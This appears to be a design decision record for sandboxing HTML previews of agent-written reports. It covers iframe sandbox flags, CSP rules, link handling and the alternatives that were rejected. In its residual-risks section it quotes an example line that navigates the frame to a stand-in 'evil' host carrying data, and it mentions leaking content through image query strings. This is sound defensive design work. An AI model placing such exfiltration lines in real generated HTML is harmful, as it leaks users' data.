# HTML preview sandbox

## Context

Agents write HTML reports into user storage. Their content comes partly from
web search and MCP tool output, so it must be treated as attacker-controlled
(prompt injection). The frontend keeps Cognito tokens in `localStorage` and
calls the Backend same-origin at `/api/*`. The frontend distribution sends no
CSP, so script running in the app origin has nothing to stop it.

## Decision

- The storage previews (modal and chat dock) render HTML only in
  `<iframe sandbox="allow-scripts" srcdoc=…>`. The file is fetched as text
  through the presigned URL (`useFileText`) and passed through
  `buildSandboxedSrcDoc` (`packages/frontend/src/utils/htmlSandbox.ts`).
  A "Source" toggle shows the highlighted markup instead.
- `buildSandboxedSrcDoc` puts a CSP `<meta>` first in `<head>`. By default it
  blocks all network loads. The per-file "Remote resources" toggle allows
  `https:` scripts, styles, images, fonts and media. `connect-src`,
  `form-action` and `base-uri` stay `'none'` in both modes. It also removes
  `<meta http-equiv=refresh>`, and gives every non-fragment link
  `target=_blank`, so the sandbox blocks the popup. In-page `#anchors` are
  handled by an injected click handler that calls `scrollIntoView`. Chrome
  would otherwise navigate the sandboxed frame to an empty `about:blank#id`
  and the content would disappear. A `<base target=_blank>` was rejected
  because it cannot exempt those anchors.
- Truncated files (> `TEXT_PREVIEW_MAX_BYTES`) are shown only as source. The
  chat dock knows only the path, so `useFileText` reads the total size from
  `Content-Range`, which the user bucket's CORS exposes. If that header is
  unreadable, it treats a full 1 MiB buffer as truncated.
- Inline presigned URLs keep serving HTML as `text/plain`
  (`preview-content-type.ts`). `canOpenInNewTab` excludes HTML, so chat links
  and "Open in new tab" download the file instead.

## Rejected alternatives

- **`allow-same-origin` (with or without `allow-scripts`)**: together with
  `allow-scripts`, the document can remove its own sandbox and read the app's
  tokens. Without scripts there is no reason to add it.
- **`blob:` URL in a new tab or iframe**: a blob URL inherits the origin of
  the page that created it, so it is the app origin. This is full XSS.
- **Serving `text/html` from S3 (inline presigned URL)**: scripts would run
  on the bucket origin. They could not reach the app's tokens, but the result
  is a phishing page on a trusted-looking AWS domain, and every other S3 code
  path would need the same review.
- **Remote resources on by default**: CDN-based charts would work without a
  click, but every opened file could beacon its contents out.
- **Separate sandbox domain (usercontent-style)**: the strongest option. It
  gives process isolation and would allow relative assets. It is deferred
  because it needs a new distribution, a new domain and a new auth path for
  the content.

## Residual risks (accepted)

- CSP cannot stop the frame from navigating itself
  (`location = 'https://evil/?d=…'`), and remote mode allows exfiltration via
  `<img src>` query strings. The sandbox only keeps the page away from the
  app's origin. It does not stop the HTML from leaking its own content.
- On browsers that run sandboxed frames in the parent's process, a busy-loop
  script can freeze the tab.
- Relative asset references (sibling `style.css`) do not load.
- srcdoc documents are always in standards mode, so pages written for legacy
  doctypes (HTML 4.01 Transitional quirks) can lay out differently than they
  do when opened directly.
